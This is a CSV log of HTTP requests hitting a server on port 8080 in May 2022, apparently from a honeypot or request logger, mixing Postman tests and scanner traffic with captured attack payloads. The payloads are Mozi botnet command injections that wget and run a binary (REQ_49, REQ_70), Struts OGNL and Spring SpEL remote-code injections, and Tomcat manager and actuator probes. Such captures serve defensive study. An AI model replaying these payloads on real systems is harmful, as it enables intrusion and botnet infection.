ID,ADDR,VALUE,TIME
REQ_24_P8080,"('54.86.50.139', 23873)","b'GET /?=asasas HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 00b73e31-849a-4ab2-8914-4868f1188c9d\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 09:45:41.622316
REQ_25_P8080,"('54.86.50.139', 39444)","b'GET /?=asasas HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: a869032f-fcfc-48f5-a026-2c59377b54a8\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 09:45:43.769479
REQ_26_P8080,"('54.86.50.139', 54125)","b'GET /?=asasas HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 351c79c9-098e-41a5-852b-147704879f79\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 09:47:31.000531
REQ_27_P8080,"('54.86.50.139', 41447)","b'GET /?=asasas HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: beb0a9b1-dd8f-41b5-ba35-6a3d359eb59e\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 09:47:34.488792
REQ_28_P8080,"('54.86.50.139', 61976)","b'GET /?=asasas HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 47674dd4-2723-4e50-ab20-d64c48d03bf3\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 09:48:03.874500
REQ_29_P8080,"('54.86.50.139', 14164)","b'GET /?=asasas HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 5e391526-4418-4855-ad30-9f95526ad268\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 10:08:54.946901
REQ_30_P8080,"('192.241.222.168', 42822)",b'GET /actuator/health HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-10 10:14:44.822090
REQ_31_P8080,"('45.237.188.139', 59070)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-10 10:40:47.144202
REQ_32_P8080,"('155.12.94.24', 38418)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\r\nContent-Length: 0\r\n\r\n'",2022-05-10 11:14:54.872801
REQ_33_P8080,"('45.61.185.106', 46320)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-10 11:56:18.278953
REQ_34_P8080,"('192.241.213.59', 47630)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-10 11:57:27.827893
REQ_35_P8080,"('54.86.50.139', 64475)","b'GET / HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 04659e4c-8eda-4793-8778-b7e14fe79f4c\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 13:42:34.891806
REQ_36_P8080,"('54.86.50.139', 34533)","b'GET / HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: e4bcce4b-c89d-4958-a961-0d0ad6163b80\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 13:42:40.177649
REQ_37_P8080,"('54.86.50.139', 8953)","b'GET / HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 973dcf39-5f45-420c-8a3c-1b5338e05c0d\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 13:43:36.038579
REQ_38_P8080,"('54.86.50.139', 33580)","b'GET / HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 8060cfc7-7970-4f38-92cb-9ac5055674f6\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 13:45:43.653496
REQ_39_P8080,"('54.86.50.139', 63019)","b'GET / HTTP/1.1\r\nUser-Agent: PostmanRuntime/7.29.0\r\nAccept: */*\r\nCache-Control: no-cache\r\nPostman-Token: 79384d79-2725-4be0-b3b9-9594e3af3fbd\r\nHost: 54.91.30.20:8080\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n'",2022-05-10 13:49:18.321522
REQ_40_P8080,"('192.241.193.77', 39574)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-10 13:50:21.867515
REQ_41_P8080,"('183.230.10.177', 62382)","b'GET /invoker/readonly HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: close\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'",2022-05-10 17:09:58.470225
REQ_42_P8080,"('183.230.10.177', 62387)","b""GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: close\r\nContent-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('oxaulkhd','1')}.multipart/form-data\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n""",2022-05-10 17:09:59.062028
REQ_43_P8080,"('183.230.10.177', 62421)","b'GET /script HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: close\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'",2022-05-10 17:10:02.709765
REQ_44_P8080,"('183.230.10.177', 62428)","b'GET /manager/html HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAuthorization: Basic OGhZVFNVRms6OGhZVFNVRms=\r\nConnection: close\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'",2022-05-10 17:10:04.750098
REQ_45_P8080,"('183.230.10.177', 62448)","b'GET /actuator/env HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: close\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'",2022-05-10 17:10:06.788436
REQ_46_P8080,"('124.235.138.103', 51312)",b'',2022-05-10 17:18:18.894695
REQ_47_P8080,"('124.235.138.103', 51364)","b'HEAD http://110.242.68.4/ HTTP/1.1\r\nHost: 110.242.68.4\r\nProxy-Authorization: Basic Og==\r\nProxy-Connection: Keep-Alive\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate, sdch\r\nUser-Agent: Mozilla/5.01712517 Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\r\nCache-Control: max-age=0\r\nAccept-Language: zh-CN,zh;q=0.8\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n\r\n'",2022-05-10 17:18:20.127704
REQ_48_P8080,"('137.184.37.199', 36262)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-10 17:43:31.229134
REQ_49_P8080,"('202.178.125.67', 59316)",b'GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://202.178.125.67:40396/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0\r\n\r\n',2022-05-10 18:49:08.616911
REQ_50_P8080,"('167.249.90.73', 37141)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-10 18:59:19.807968
REQ_51_P8080,"('137.184.38.61', 43458)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-10 19:09:48.469990
REQ_52_P8080,"('172.105.189.111', 33170)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-10 20:43:15.907915
REQ_53_P8080,"('198.235.24.155', 61961)","b'GET / HTTP/1.0\r\nUser-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com\r\nAccept: */*\r\n\r\n'",2022-05-10 20:53:15.082444
REQ_54_P8080,"('137.184.38.61', 59980)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-10 21:58:47.212316
REQ_55_P8080,"('186.251.228.61', 57538)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r\nContent-Length: 0\r\n\r\n'",2022-05-10 22:47:06.064915
REQ_56_P8080,"('82.196.14.19', 58340)",b'',2022-05-10 23:00:41.164840
REQ_57_P8080,"('82.196.14.19', 40642)",b'GET /TP/public/index.php HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\r\nConnection: close\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-10 23:00:41.222739
REQ_58_P8080,"('82.196.14.19', 35760)","b'POST /users?page=&size=5 HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\r\nContent-Length: 119\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\n\r\nusername[#this.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""touch /tmp/su"")]=&password=&repeatedPassword='",2022-05-10 23:00:43.398485
REQ_59_P8080,"('82.196.14.19', 53914)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\r\nConnection: close\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-10 23:00:46.162963
REQ_60_P8080,"('137.184.37.199', 59814)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-10 23:27:33.456955
REQ_61_P8080,"('128.14.209.162', 52634)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-10 23:38:01.107748
REQ_62_P8080,"('137.184.177.53', 41564)","b'GET /script HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n\n\n\n\n'",2022-05-10 23:48:03.597556
REQ_63_P8080,"('137.184.177.40', 52374)","b'GET /script HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n\n\n\n\n'",2022-05-11 00:10:11.571851
REQ_64_P8080,"('45.61.188.169', 38654)","b'GET /config/getuser?index=0 HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",2022-05-11 00:11:47.056671
REQ_65_P8080,"('137.184.37.199', 51090)","b'GET /manager/html HTTP/1.1\nHost: \nConnection: close\nUser_Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\n\n\n'",2022-05-11 07:59:23.171501
REQ_66_P8080,"('216.218.206.66', 44186)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\n\r\n',2022-05-11 08:44:59.050310
REQ_67_P8080,"('104.206.128.50', 52237)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: https://gdnplus.com:Gather Analyze Provide.\r\n\r\n',2022-05-11 09:16:03.233714
REQ_68_P8080,"('14.120.50.181', 27437)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\r\nContent-Length: 0\r\n\r\n'",2022-05-11 09:21:27.236171
REQ_69_P8080,"('128.14.209.162', 52706)","b'GET /admin/ HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 \r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n'",2022-05-11 10:22:12.535842
REQ_70_P8080,"('175.107.1.181', 49185)",b'GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.107.1.181:57789/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0\r\n\r\n',2022-05-11 11:16:27.769862
REQ_71_P8080,"('198.235.24.148', 59489)","b""\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x03\xae<\x0b\xd76\xac\x95\x18\xb1\xc1\xe7\\\xd2]1\xe7Vz6(%\xe6\x81h\x14+j\x19(r=\x9e\x00\x00h\xcc\x14\xcc\x13\xc0/\xc0+\xc00\xc0,\xc0\x11\xc0\x07\xc0'\xc0#\xc0\x13\xc0\t\xc0(\xc0$\xc0\x14\xc0\n\xcc\x15\x00\x9e\x00\x9f\x00g\x00k\x003\x009\x00\x9c\x00\x9d\x00\x05\x00\x04\x00<\x00=\x00/\x005\xc0\x12\x00\x16\x00\n\x00\x03\x00\x08\x00\x06\x00\x14\x00\x11\x00\x19\x00\x17\x002\xc0\x08\x00\x12\x00\x13\x00\x15\x008\x00@\x00f\x00j\x00\xa2\x00\xa3\x01\x00\x005\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\n\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\r\x00\x0c\x00\n\x04\x01\x04\x03\x02\x01\x02\x03\x02\x02\xff\x01\x00\x01\x00\x00\x0f\x00\x01\x01""",2022-05-11 11:25:05.336823
REQ_72_P8080,"('95.171.6.243', 32806)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\r\nContent-Length: 0\r\n\r\n'",2022-05-11 11:38:59.509657
REQ_73_P8080,"('178.32.197.94', 57979)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:8080\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n\r\n'",2022-05-11 11:57:17.481745
REQ_74_P8080,"('157.245.203.107', 52756)",b'GET /login?from=%2F HTTP/1.1\r\nHost: localhost:8080\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0\r\n\r\n',2022-05-11 12:06:06.623968
REQ_75_P8080,"('192.241.216.96', 33978)",b'',2022-05-11 12:08:22.302867
